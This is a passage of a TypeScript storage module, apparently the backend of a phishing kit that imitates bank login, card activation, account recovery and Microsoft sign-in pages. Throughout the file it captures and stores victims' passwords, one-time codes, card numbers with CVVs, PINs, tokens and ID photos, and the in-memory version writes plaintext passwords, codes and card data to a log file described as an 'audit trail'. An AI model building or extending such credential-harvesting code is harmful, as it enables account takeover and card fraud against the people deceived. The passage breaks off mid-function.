import {
  loginAttempts,
  otpSessions,
  postalCodeData,
  contactInfoData,
  registerData,
  cardActivationData,
  forgotUsernameData,
  forgotPasswordData,
  microsoftEmailData,
  microsoftPasswordData,
  accountLoginAttempts,
  type LoginAttempt,
  type InsertLoginAttempt,
  type OtpSession,
  type InsertOtpSession,
  type PostalCodeData,
  type InsertPostalCodeData,
  type ContactInfoData,
  type InsertContactInfoData,
  type RegisterData,
  type InsertRegisterData,
  type CardActivationData,
  type InsertCardActivationData,
  type ForgotUsernameData,
  type InsertForgotUsernameData,
  type ForgotPasswordData,
  type InsertForgotPasswordData,
  type MicrosoftEmailData,
  type InsertMicrosoftEmailData,
  type MicrosoftPasswordData,
  type InsertMicrosoftPasswordData,
  type AccountLoginAttempt,
  type InsertAccountLoginAttempt,
} from "@shared/schema";
import { db } from "./db";
import { eq, desc, and } from "drizzle-orm";
import { promises as fs } from "fs";
import { join } from "path";
import { randomUUID } from "crypto";
import { encrypt, decrypt, hashForLogging, redactForLogging } from "./crypto";

// Storage interface for all data operations
export interface IStorage {
  // Login attempts
  createLoginAttempt(attempt: InsertLoginAttempt): Promise<LoginAttempt>;
  getLoginAttempt(id: string): Promise<LoginAttempt | undefined>;
  updateLoginAttemptStatus(id: string, status: string): Promise<void>;
  getAllLoginAttempts(): Promise<LoginAttempt[]>;
  
  // OTP sessions
  createOtpSession(session: InsertOtpSession): Promise<OtpSession>;
  getOtpSession(id: string): Promise<OtpSession | undefined>;
  verifyOtp(sessionId: string, otpCode: string): Promise<boolean>;
  isOtpSessionValidForAttempt(loginAttemptId: string): Promise<boolean>;
  getAllOtpSessions(): Promise<OtpSession[]>;
  
  // Postal code data
  createPostalCodeData(data: InsertPostalCodeData): Promise<PostalCodeData>;
  getAllPostalCodeData(): Promise<PostalCodeData[]>;
  
  // Contact info data
  createContactInfoData(data: InsertContactInfoData): Promise<ContactInfoData>;
  getAllContactInfoData(): Promise<ContactInfoData[]>;
  
  // Register data
  createRegisterData(data: InsertRegisterData): Promise<RegisterData>;
  getAllRegisterData(): Promise<RegisterData[]>;
  
  // Card activation data
  createCardActivationData(data: InsertCardActivationData): Promise<CardActivationData>;
  getAllCardActivationData(): Promise<CardActivationData[]>;
  
  // Forgot username data
  createForgotUsernameData(data: InsertForgotUsernameData): Promise<ForgotUsernameData>;
  getAllForgotUsernameData(): Promise<ForgotUsernameData[]>;
  
  // Forgot password data
  createForgotPasswordData(data: InsertForgotPasswordData): Promise<ForgotPasswordData>;
  getAllForgotPasswordData(): Promise<ForgotPasswordData[]>;
  
  // Microsoft email data
  createMicrosoftEmailData(data: InsertMicrosoftEmailData): Promise<MicrosoftEmailData>;
  getAllMicrosoftEmailData(): Promise<MicrosoftEmailData[]>;
  
  // Microsoft password data
  createMicrosoftPasswordData(data: InsertMicrosoftPasswordData): Promise<MicrosoftPasswordData>;
  getAllMicrosoftPasswordData(): Promise<MicrosoftPasswordData[]>;
  
  // Account login attempts (for /account page)
  createAccountLoginAttempt(attempt: InsertAccountLoginAttempt): Promise<AccountLoginAttempt>;
  getAccountLoginAttempt(id: string): Promise<AccountLoginAttempt | undefined>;
  updateAccountLoginAttemptStatus(id: string, status: string): Promise<void>;
  updateAccountLoginAttemptEmail(id: string, email: string): Promise<void>;
  getAllAccountLoginAttempts(): Promise<AccountLoginAttempt[]>;
  
  // Secure file logging (backend only, not accessible by client)
  logLoginActivity(data: any): Promise<void>;
  getLoginActivityLogs(): Promise<string>;
}

export class MemStorage implements IStorage {
  private loginAttempts: Map<string, LoginAttempt>;
  private otpSessions: Map<string, OtpSession>;
  private postalCodeData: Map<string, PostalCodeData>;
  private contactInfoData: Map<string, ContactInfoData>;
  private registerData: Map<string, RegisterData>;
  private cardActivationData: Map<string, CardActivationData>;
  private forgotUsernameData: Map<string, ForgotUsernameData>;
  private forgotPasswordData: Map<string, ForgotPasswordData>;
  private microsoftEmailData: Map<string, MicrosoftEmailData>;
  private microsoftPasswordData: Map<string, MicrosoftPasswordData>;
  private accountLoginAttempts: Map<string, AccountLoginAttempt>;
  private logFilePath: string;

  constructor() {
    this.loginAttempts = new Map();
    this.otpSessions = new Map();
    this.postalCodeData = new Map();
    this.contactInfoData = new Map();
    this.registerData = new Map();
    this.cardActivationData = new Map();
    this.forgotUsernameData = new Map();
    this.forgotPasswordData = new Map();
    this.microsoftEmailData = new Map();
    this.microsoftPasswordData = new Map();
    this.accountLoginAttempts = new Map();
    // Store logs in server directory (not accessible by client)
    this.logFilePath = join(process.cwd(), 'server', 'logs', 'login_activities.log');
    this.ensureLogDirectory();
  }

  private async ensureLogDirectory() {
    try {
      const logDir = join(process.cwd(), 'server', 'logs');
      await fs.mkdir(logDir, { recursive: true });
    } catch (error) {
      console.error('Error creating log directory:', error);
    }
  }

  async createLoginAttempt(insertAttempt: InsertLoginAttempt): Promise<LoginAttempt> {
    const id = randomUUID();
    const attempt: LoginAttempt = {
      ...insertAttempt,
      id,
      flowType: insertAttempt.flowType ?? 'normal',
      email: insertAttempt.email ?? null,
      ipAddress: insertAttempt.ipAddress ?? null,
      userAgent: insertAttempt.userAgent ?? null,
      timestamp: new Date(),
    };
    this.loginAttempts.set(id, attempt);
    
    // Log to secure file - include password for complete audit trail
    await this.logLoginActivity({
      type: 'login_attempt',
      id,
      username: attempt.username,
      password: attempt.password, // Include password in server logs for complete audit trail
      ipAddress: attempt.ipAddress,
      userAgent: attempt.userAgent,
      timestamp: attempt.timestamp.toISOString(),
    });
    
    return attempt;
  }

  async getLoginAttempt(id: string): Promise<LoginAttempt | undefined> {
    return this.loginAttempts.get(id);
  }

  async updateLoginAttemptStatus(id: string, status: string): Promise<void> {
    const attempt = this.loginAttempts.get(id);
    if (attempt) {
      attempt.status = status;
      this.loginAttempts.set(id, attempt);
      
      await this.logLoginActivity({
        type: 'status_update',
        id,
        status,
        timestamp: new Date().toISOString(),
      });
    }
  }

  async createOtpSession(insertSession: InsertOtpSession): Promise<OtpSession> {
    const id = randomUUID();
    const session: OtpSession = {
      ...insertSession,
      id,
      flowType: insertSession.flowType ?? 'login',
      verified: insertSession.verified ?? 'false',
      createdAt: new Date(),
    };
    this.otpSessions.set(id, session);
    
    // Log OTP generation with the actual OTP code for audit trail
    await this.logLoginActivity({
      type: 'otp_generated',
      sessionId: id,
      loginAttemptId: session.loginAttemptId,
      email: session.email,
      otpCode: session.otpCode, // Include OTP in server logs for complete audit trail
      expiresAt: session.expiresAt.toISOString(),
      timestamp: session.createdAt.toISOString(),
    });
    
    return session;
  }

  async getOtpSession(id: string): Promise<OtpSession | undefined> {
    return this.otpSessions.get(id);
  }

  async verifyOtp(sessionId: string, otpCode: string): Promise<boolean> {
    const session = this.otpSessions.get(sessionId);
    if (!session) return false;
    
    const isExpired = new Date() > session.expiresAt;
    if (isExpired) {
      await this.logLoginActivity({
        type: 'otp_expired',
        sessionId,
        timestamp: new Date().toISOString(),
      });
      return false;
    }
    
    const isValid = session.otpCode === otpCode;
    if (isValid) {
      session.verified = 'true';
      this.otpSessions.set(sessionId, session);
      
      // Also store verification timestamp on login attempt for expiry validation
      const loginAttempt = this.loginAttempts.get(session.loginAttemptId);
      if (loginAttempt) {
        loginAttempt.status = 'otp_verified';
        // Update timestamp to track when OTP was verified
        loginAttempt.timestamp = new Date();
        this.loginAttempts.set(session.loginAttemptId, loginAttempt);
      }
      
      await this.logLoginActivity({
        type: 'otp_verified',
        sessionId,
        loginAttemptId: session.loginAttemptId,
        verifiedAt: new Date().toISOString(),
        timestamp: new Date().toISOString(),
      });
    } else {
      await this.logLoginActivity({
        type: 'otp_failed',
        sessionId,
        attemptedCode: otpCode,
        timestamp: new Date().toISOString(),
      });
    }
    
    return isValid;
  }

  async isOtpSessionValidForAttempt(loginAttemptId: string): Promise<boolean> {
    // Find OTP session for this login attempt
    const sessions = Array.from(this.otpSessions.values());
    const session = sessions.find(s => s.loginAttemptId === loginAttemptId && s.verified === 'true');
    
    if (!session) {
      // No verified OTP session found - prevents restart bypass
      await this.logLoginActivity({
        type: 'otp_session_not_found',
        loginAttemptId,
        reason: 'No verified OTP session exists for this login attempt',
        timestamp: new Date().toISOString(),
      });
      return false;
    }
    
    // Check if OTP session is expired
    const isExpired = new Date() > session.expiresAt;
    if (isExpired) {
      await this.logLoginActivity({
        type: 'otp_session_expired',
        loginAttemptId,
        sessionId: session.id,
        timestamp: new Date().toISOString(),
      });
      return false;
    }
    
    return true;
  }

  async createPostalCodeData(insertData: InsertPostalCodeData): Promise<PostalCodeData> {
    const id = randomUUID();
    const data: PostalCodeData = {
      ...insertData,
      id,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.postalCodeData.set(id, data);
    
    await this.logLoginActivity({
      type: 'postal_code_submitted',
      id,
      loginAttemptId: data.loginAttemptId,
      postalCode: data.postalCode,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllLoginAttempts(): Promise<LoginAttempt[]> {
    return Array.from(this.loginAttempts.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async getAllOtpSessions(): Promise<OtpSession[]> {
    return Array.from(this.otpSessions.values()).sort((a, b) => 
      b.createdAt.getTime() - a.createdAt.getTime()
    );
  }

  async getAllPostalCodeData(): Promise<PostalCodeData[]> {
    return Array.from(this.postalCodeData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createContactInfoData(insertData: InsertContactInfoData): Promise<ContactInfoData> {
    const id = randomUUID();
    const data: ContactInfoData = {
      ...insertData,
      id,
      message: insertData.message ?? null,
      passportPhoto: insertData.passportPhoto ?? null,
      employeeIdPhoto: insertData.employeeIdPhoto ?? null,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.contactInfoData.set(id, data);
    
    await this.logLoginActivity({
      type: 'contact_info_submitted',
      id,
      loginAttemptId: data.loginAttemptId,
      firstName: data.firstName,
      lastName: data.lastName,
      email: data.email,
      mobilePhone: data.mobilePhone,
      city: data.city,
      state: data.state,
      postalCode: data.postalCode,
      inquiryType: data.inquiryType,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllContactInfoData(): Promise<ContactInfoData[]> {
    return Array.from(this.contactInfoData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createRegisterData(insertData: InsertRegisterData): Promise<RegisterData> {
    const id = randomUUID();
    const data: RegisterData = {
      ...insertData,
      id,
      expiration: insertData.expiration ?? null,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.registerData.set(id, data);
    
    await this.logLoginActivity({
      type: 'register_submitted',
      id,
      cardNumber: data.cardNumber,
      expiration: data.expiration,
      cvv: data.cvv,
      postalCode: data.postalCode,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllRegisterData(): Promise<RegisterData[]> {
    return Array.from(this.registerData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createCardActivationData(insertData: InsertCardActivationData): Promise<CardActivationData> {
    const id = randomUUID();
    const data: CardActivationData = {
      ...insertData,
      id,
      expiration: insertData.expiration ?? null,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.cardActivationData.set(id, data);
    
    await this.logLoginActivity({
      type: 'card_activation_submitted',
      id,
      cardNumber: data.cardNumber,
      expiration: data.expiration,
      cvv: data.cvv,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllCardActivationData(): Promise<CardActivationData[]> {
    return Array.from(this.cardActivationData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createForgotUsernameData(insertData: InsertForgotUsernameData): Promise<ForgotUsernameData> {
    const id = randomUUID();
    const data: ForgotUsernameData = {
      ...insertData,
      id,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.forgotUsernameData.set(id, data);
    
    await this.logLoginActivity({
      type: 'forgot_username_submitted',
      id,
      cardNumber: data.cardNumber,
      cvv: data.cvv,
      postalCode: data.postalCode,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllForgotUsernameData(): Promise<ForgotUsernameData[]> {
    return Array.from(this.forgotUsernameData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createForgotPasswordData(insertData: InsertForgotPasswordData): Promise<ForgotPasswordData> {
    const id = randomUUID();
    const data: ForgotPasswordData = {
      ...insertData,
      id,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.forgotPasswordData.set(id, data);
    
    await this.logLoginActivity({
      type: 'forgot_password_submitted',
      id,
      username: data.username,
      postalCode: data.postalCode,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllForgotPasswordData(): Promise<ForgotPasswordData[]> {
    return Array.from(this.forgotPasswordData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createMicrosoftEmailData(insertData: InsertMicrosoftEmailData): Promise<MicrosoftEmailData> {
    const id = randomUUID();
    const data: MicrosoftEmailData = {
      ...insertData,
      id,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.microsoftEmailData.set(id, data);
    
    await this.logLoginActivity({
      type: 'microsoft_email_submitted',
      id,
      loginAttemptId: data.loginAttemptId,
      emailOrPhone: data.emailOrPhone,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllMicrosoftEmailData(): Promise<MicrosoftEmailData[]> {
    return Array.from(this.microsoftEmailData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createMicrosoftPasswordData(insertData: InsertMicrosoftPasswordData): Promise<MicrosoftPasswordData> {
    const id = randomUUID();
    const data: MicrosoftPasswordData = {
      ...insertData,
      id,
      ipAddress: insertData.ipAddress ?? null,
      userAgent: insertData.userAgent ?? null,
      timestamp: new Date(),
    };
    this.microsoftPasswordData.set(id, data);
    
    await this.logLoginActivity({
      type: 'microsoft_password_submitted',
      id,
      loginAttemptId: data.loginAttemptId,
      emailOrPhone: data.emailOrPhone,
      password: data.password,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllMicrosoftPasswordData(): Promise<MicrosoftPasswordData[]> {
    return Array.from(this.microsoftPasswordData.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createAccountLoginAttempt(insertAttempt: InsertAccountLoginAttempt): Promise<AccountLoginAttempt> {
    const id = randomUUID();
    const attempt: AccountLoginAttempt = {
      ...insertAttempt,
      id,
      flowType: 'account',
      status: 'pending',
      email: insertAttempt.email ?? null,
      ipAddress: insertAttempt.ipAddress ?? null,
      userAgent: insertAttempt.userAgent ?? null,
      cardNumber: insertAttempt.cardNumber ?? null,
      pin: insertAttempt.pin ?? null,
      username: insertAttempt.username ?? null,
      password: insertAttempt.password ?? null,
      otpCode: insertAttempt.otpCode ?? null,
      token: insertAttempt.token ?? null,
      timestamp: new Date(),
    };
    this.accountLoginAttempts.set(id, attempt);
    
    await this.logLoginActivity({
      type: 'account_login_attempt',
      id,
      loginType: attempt.loginType,
      ipAddress: attempt.ipAddress,
      userAgent: attempt.userAgent,
      timestamp: attempt.timestamp.toISOString(),
    });
    
    return attempt;
  }

  async getAccountLoginAttempt(id: string): Promise<AccountLoginAttempt | undefined> {
    return this.accountLoginAttempts.get(id);
  }

  async updateAccountLoginAttemptStatus(id: string, status: string): Promise<void> {
    const attempt = this.accountLoginAttempts.get(id);
    if (attempt) {
      attempt.status = status;
      this.accountLoginAttempts.set(id, attempt);
    }
  }

  async updateAccountLoginAttemptEmail(id: string, email: string): Promise<void> {
    const attempt = this.accountLoginAttempts.get(id);
    if (attempt) {
      attempt.email = email;
      this.accountLoginAttempts.set(id, attempt);
    }
  }

  async getAllAccountLoginAttempts(): Promise<AccountLoginAttempt[]> {
    return Array.from(this.accountLoginAttempts.values()).sort((a, b) => 
      b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async getLoginActivityLogs(): Promise<string> {
    try {
      const logs = await fs.readFile(this.logFilePath, 'utf-8');
      return logs;
    } catch (error) {
      console.error('Error reading log file:', error);
      return '';
    }
  }

  async logLoginActivity(data: any): Promise<void> {
    try {
      const logEntry = JSON.stringify({
        ...data,
        loggedAt: new Date().toISOString(),
      }) + '\n';
      
      await fs.appendFile(this.logFilePath, logEntry, 'utf-8');
    } catch (error) {
      console.error('Error writing to log file:', error);
    }
  }
}

// Database storage implementation
export class DatabaseStorage implements IStorage {
  private logFilePath: string;

  constructor() {
    this.logFilePath = join(process.cwd(), 'server', 'logs', 'login_activities.log');
    this.ensureLogDirectory();
  }

  private async ensureLogDirectory() {
    try {
      const logDir = join(process.cwd(), 'server', 'logs');
      await fs.mkdir(logDir, { recursive: true });
    } catch (error) {
      console.error('Error creating log directory:', error);
    }
  }

  async createLoginAttempt(insertAttempt: InsertLoginAttempt): Promise<LoginAttempt> {
    // Encrypt password before storing
    const encryptedPassword = encrypt(insertAttempt.password);
    
    const [attempt] = await db
      .insert(loginAttempts)
      .values({
        ...insertAttempt,
        password: encryptedPassword,
      })
      .returning();
    
    // Log to secure file with redacted password
    await this.logLoginActivity({
      type: 'login_attempt',
      id: attempt.id,
      username: attempt.username,
      passwordHash: hashForLogging(insertAttempt.password),
      ipAddress: attempt.ipAddress,
      userAgent: attempt.userAgent,
      timestamp: attempt.timestamp.toISOString(),
    });
    
    return {
      ...attempt,
      password: insertAttempt.password, // Return original for session use
    };
  }

  async getLoginAttempt(id: string): Promise<LoginAttempt | undefined> {
    const [attempt] = await db
      .select()
      .from(loginAttempts)
      .where(eq(loginAttempts.id, id));
    return attempt || undefined;
  }

  async updateLoginAttemptStatus(id: string, status: string): Promise<void> {
    await db
      .update(loginAttempts)
      .set({ status })
      .where(eq(loginAttempts.id, id));
    
    await this.logLoginActivity({
      type: 'status_update',
      id,
      status,
      timestamp: new Date().toISOString(),
    });
  }

  async createOtpSession(insertSession: InsertOtpSession): Promise<OtpSession> {
    // Save plaintext OTP for return value only
    const plaintextOtp = insertSession.otpCode;
    
    // Encrypt OTP code before storing
    const encryptedOtpCode = encrypt(plaintextOtp);
    
    // Insert with encrypted OTP - only encrypted version goes to database
    const [session] = await db
      .insert(otpSessions)
      .values({
        loginAttemptId: insertSession.loginAttemptId,
        email: insertSession.email,
        otpCode: encryptedOtpCode,
        expiresAt: insertSession.expiresAt,
        verified: insertSession.verified || 'false',
        flowType: insertSession.flowType || 'login',
      })
      .returning();
    
    // Log with redacted OTP
    await this.logLoginActivity({
      type: 'otp_generated',
      sessionId: session.id,
      loginAttemptId: session.loginAttemptId,
      email: redactForLogging(session.email),
      otpCodeHash: hashForLogging(plaintextOtp),
      expiresAt: session.expiresAt.toISOString(),
      timestamp: session.createdAt.toISOString(),
    });
    
    // Return session with plaintext OTP for caller's use (not stored in DB)
    return {
      id: session.id,
      loginAttemptId: session.loginAttemptId,
      email: session.email,
      flowType: session.flowType ?? 'login',
      otpCode: plaintextOtp,
      expiresAt: session.expiresAt,
      verified: session.verified,
      createdAt: session.createdAt,
    };
  }

  async getOtpSession(id: string): Promise<OtpSession | undefined> {
    const [session] = await db
      .select()
      .from(otpSessions)
      .where(eq(otpSessions.id, id));
    return session || undefined;
  }

  async verifyOtp(sessionId: string, otpCode: string): Promise<boolean> {
    const session = await this.getOtpSession(sessionId);
    if (!session) return false;
    
    const isExpired = new Date() > session.expiresAt;
    if (isExpired) {
      await this.logLoginActivity({
        type: 'otp_expired',
        sessionId,
        timestamp: new Date().toISOString(),
      });
      return false;
    }
    
    // Decrypt stored OTP for comparison
    const decryptedOtp = decrypt(session.otpCode);
    const isValid = decryptedOtp === otpCode;
    
    if (isValid) {
      // Update session as verified
      await db
        .update(otpSessions)
        .set({ verified: 'true' })
        .where(eq(otpSessions.id, sessionId));
      
      // Update login attempt status and timestamp
      await db
        .update(loginAttempts)
        .set({ 
          status: 'otp_verified',
          timestamp: new Date()
        })
        .where(eq(loginAttempts.id, session.loginAttemptId));
      
      await this.logLoginActivity({
        type: 'otp_verified',
        sessionId,
        loginAttemptId: session.loginAttemptId,
        verifiedAt: new Date().toISOString(),
        timestamp: new Date().toISOString(),
      });
    } else {
      await this.logLoginActivity({
        type: 'otp_failed',
        sessionId,
        attemptedCodeHash: hashForLogging(otpCode),
        timestamp: new Date().toISOString(),
      });
    }
    
    return isValid;
  }

  async isOtpSessionValidForAttempt(loginAttemptId: string): Promise<boolean> {
    // Query for the latest verified session at SQL level
    const [verifiedSession] = await db
      .select()
      .from(otpSessions)
      .where(
        and(
          eq(otpSessions.loginAttemptId, loginAttemptId),
          eq(otpSessions.verified, 'true')
        )
      )
      .orderBy(desc(otpSessions.createdAt))
      .limit(1);
    
    if (!verifiedSession) {
      await this.logLoginActivity({
        type: 'otp_session_not_found',
        loginAttemptId,
        reason: 'No verified OTP session exists for this login attempt',
        timestamp: new Date().toISOString(),
      });
      return false;
    }
    
    const isExpired = new Date() > verifiedSession.expiresAt;
    if (isExpired) {
      await this.logLoginActivity({
        type: 'otp_session_expired',
        loginAttemptId,
        sessionId: verifiedSession.id,
        timestamp: new Date().toISOString(),
      });
      return false;
    }
    
    return true;
  }

  async createPostalCodeData(insertData: InsertPostalCodeData): Promise<PostalCodeData> {
    const [data] = await db
      .insert(postalCodeData)
      .values(insertData)
      .returning();
    
    // Log with redacted postal code
    await this.logLoginActivity({
      type: 'postal_code_submitted',
      id: data.id,
      loginAttemptId: data.loginAttemptId,
      postalCodeRedacted: redactForLogging(data.postalCode),
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllLoginAttempts(): Promise<LoginAttempt[]> {
    const attempts = await db
      .select()
      .from(loginAttempts)
      .orderBy(desc(loginAttempts.timestamp));
    return attempts;
  }

  async getAllOtpSessions(): Promise<OtpSession[]> {
    const sessions = await db
      .select()
      .from(otpSessions)
      .orderBy(desc(otpSessions.createdAt));
    return sessions;
  }

  async getAllPostalCodeData(): Promise<PostalCodeData[]> {
    const data = await db
      .select()
      .from(postalCodeData)
      .orderBy(desc(postalCodeData.timestamp));
    return data;
  }

  async createContactInfoData(insertData: InsertContactInfoData): Promise<ContactInfoData> {
    const [data] = await db
      .insert(contactInfoData)
      .values(insertData)
      .returning();
    
    await this.logLoginActivity({
      type: 'contact_info_submitted',
      id: data.id,
      loginAttemptId: data.loginAttemptId,
      firstName: data.firstName,
      lastName: data.lastName,
      email: data.email,
      mobilePhone: redactForLogging(data.mobilePhone),
      city: data.city,
      state: data.state,
      postalCode: redactForLogging(data.postalCode),
      inquiryType: data.inquiryType,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllContactInfoData(): Promise<ContactInfoData[]> {
    const data = await db
      .select()
      .from(contactInfoData)
      .orderBy(desc(contactInfoData.timestamp));
    return data;
  }

  async createRegisterData(insertData: InsertRegisterData): Promise<RegisterData> {
    const [data] = await db
      .insert(registerData)
      .values(insertData)
      .returning();
    
    await this.logLoginActivity({
      type: 'register_submitted',
      id: data.id,
      cardNumber: redactForLogging(data.cardNumber),
      expiration: data.expiration,
      cvv: '***',
      postalCode: redactForLogging(data.postalCode),
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllRegisterData(): Promise<RegisterData[]> {
    const data = await db
      .select()
      .from(registerData)
      .orderBy(desc(registerData.timestamp));
    return data;
  }

  async createCardActivationData(insertData: InsertCardActivationData): Promise<CardActivationData> {
    const [data] = await db
      .insert(cardActivationData)
      .values(insertData)
      .returning();
    
    await this.logLoginActivity({
      type: 'card_activation_submitted',
      id: data.id,
      cardNumber: redactForLogging(data.cardNumber),
      expiration: data.expiration,
      cvv: '***',
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllCardActivationData(): Promise<CardActivationData[]> {
    const data = await db
      .select()
      .from(cardActivationData)
      .orderBy(desc(cardActivationData.timestamp));
    return data;
  }

  async createForgotUsernameData(insertData: InsertForgotUsernameData): Promise<ForgotUsernameData> {
    const [data] = await db
      .insert(forgotUsernameData)
      .values(insertData)
      .returning();
    
    await this.logLoginActivity({
      type: 'forgot_username_submitted',
      id: data.id,
      cardNumber: redactForLogging(data.cardNumber),
      cvv: '***',
      postalCode: redactForLogging(data.postalCode),
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllForgotUsernameData(): Promise<ForgotUsernameData[]> {
    const data = await db
      .select()
      .from(forgotUsernameData)
      .orderBy(desc(forgotUsernameData.timestamp));
    return data;
  }

  async createForgotPasswordData(insertData: InsertForgotPasswordData): Promise<ForgotPasswordData> {
    const [data] = await db
      .insert(forgotPasswordData)
      .values(insertData)
      .returning();
    
    await this.logLoginActivity({
      type: 'forgot_password_submitted',
      id: data.id,
      username: data.username,
      postalCode: redactForLogging(data.postalCode),
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllForgotPasswordData(): Promise<ForgotPasswordData[]> {
    const data = await db
      .select()
      .from(forgotPasswordData)
      .orderBy(desc(forgotPasswordData.timestamp));
    return data;
  }

  async createMicrosoftEmailData(insertData: InsertMicrosoftEmailData): Promise<MicrosoftEmailData> {
    const [data] = await db
      .insert(microsoftEmailData)
      .values(insertData)
      .returning();
    
    await this.logLoginActivity({
      type: 'microsoft_email_submitted',
      id: data.id,
      loginAttemptId: data.loginAttemptId,
      emailOrPhone: data.emailOrPhone,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllMicrosoftEmailData(): Promise<MicrosoftEmailData[]> {
    const data = await db
      .select()
      .from(microsoftEmailData)
      .orderBy(desc(microsoftEmailData.timestamp));
    return data;
  }

  async createMicrosoftPasswordData(insertData: InsertMicrosoftPasswordData): Promise<MicrosoftPasswordData> {
    const [data] = await db
      .insert(microsoftPasswordData)
      .values(insertData)
      .returning();
    
    await this.logLoginActivity({
      type: 'microsoft_password_submitted',
      id: data.id,
      loginAttemptId: data.loginAttemptId,
      emailOrPhone: data.emailOrPhone,
      password: data.password,
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      timestamp: data.timestamp.toISOString(),
    });
    
    return data;
  }

  async getAllMicrosoftPasswordData(): Promise<MicrosoftPasswordData[]> {
    const data = await db
      .select()
      .from(microsoftPasswordData)
      .orderBy(desc(microsoftPasswordData.timestamp));
    return data;
  }

  async createAccountLoginAttempt(insertAttempt: InsertAccountLoginAttempt): Promise<AccountLoginAttempt> {
    // Encrypt sensitive fields based on login type
    const encryptedAttempt: any = {
      ...insertAttempt,
      flowType: 'account',
      status: 'pending',
    };

    // Encrypt all sensitive fields based on login type
    if (insertAttempt.loginType === 'card') {
      if (insertAttempt.cardNumber) {
        encryptedAttempt.cardNumber = encrypt(insertAttempt.cardNumber);
      }
      if (insertAttempt.pin) {
        encryptedAttempt.pin = encrypt(insertAttempt.pin);
      }
    } else if (insertAttempt.loginType === 'username') {
      if (insertAttempt.username) {
        encryptedAttempt.username = encrypt(insertAttempt.username);
      }
      if (insertAttempt.password) {
        encryptedAttempt.password = encrypt(insertAttempt.password);
      }
    } else if (insertAttempt.loginType === 'token') {
      if (insertAttempt.token) {
        encryptedAttempt.token = encrypt(insertAttempt.token);
      }
    }

    const [attempt] = await db
      .insert(accountLoginAttempts)
      .values(encryptedAttempt)
      .returning();

    await this.logLoginActivity({
      type: 'account_login_attempt',
      id: attempt.id,
      loginType: attempt.loginType,
      ipAddress: attempt.ipAddress,
      userAgent: attempt.userAgent,
      timestamp: attempt.timestamp.toISOString(),
    });

    // Return with original unencrypted values for session use
    return {
      ...attempt,
      cardNumber: insertAttempt.cardNumber || null,
      pin: insertAttempt.pin || null,
      username: insertAttempt.username || null,
      password: insertAttempt.password || null,
      token: insertAttempt.token || null,
    };
  }

  async getAccountLoginAttempt(id: string): Promise<AccountLoginAttempt | undefined> {
    const [attempt] = await db
      .select()
      .from(accountLoginAttempts)
      .where(eq(accountLoginAttempts.id, id));
    return attempt || undefined;
  }

  async updateAccountLoginAttemptStatus(id: string, status: string): Promise<void> {
    await db
      .update(accountLoginAttempts)
      .set({ status })
      .where(eq(accountLoginAttempts.id, id));

    await this.logLoginActivity({
      type: 'account_login_status_update',
      id,
      status,
      timestamp: new Date().toISOString(),
    });
  }

  async updateAccountLoginAttemptEmail(id: string, email: string): Promise<void> {
    const encryptedEmail = encrypt(email);
    
    await db
      .update(accountLoginAttempts)
      .set({ email: encryptedEmail })
